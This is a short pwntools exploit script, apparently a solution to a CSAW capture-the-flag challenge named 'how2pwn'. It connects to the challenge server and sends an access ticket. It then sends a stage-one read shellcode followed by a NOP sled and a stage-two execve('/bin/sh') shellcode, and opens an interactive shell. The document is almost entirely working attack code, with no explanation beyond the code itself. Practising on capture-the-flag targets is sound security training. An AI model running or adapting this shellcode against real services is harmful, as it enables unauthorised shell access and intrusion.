

ticket = b"764fce03d863b5155db4af260374acc1"


from pwn import *

context.arch = 'amd64'

stage1_shellcode = f'''
    xor rax, rax
    xor rdi, rdi
    mov rsi, rdx
    mov edx, 100
    syscall
'''
stage2_shellcode = f'''
mov rax, 59
lea rdi, [rip+binsh]
xor rsi, rsi
xor rdx, rdx

syscall
binsh:
.string "/bin/sh"
'''

p =  remote("how2pwn.chal.csaw.io",60002)
#p = process("bin/chal1")
import time
p.send(ticket)
time.sleep(1)
p.send(asm(stage1_shellcode))
#time.sleep(1)
p.send(b'\x90' * 32 + asm(stage2_shellcode))
p.interactive()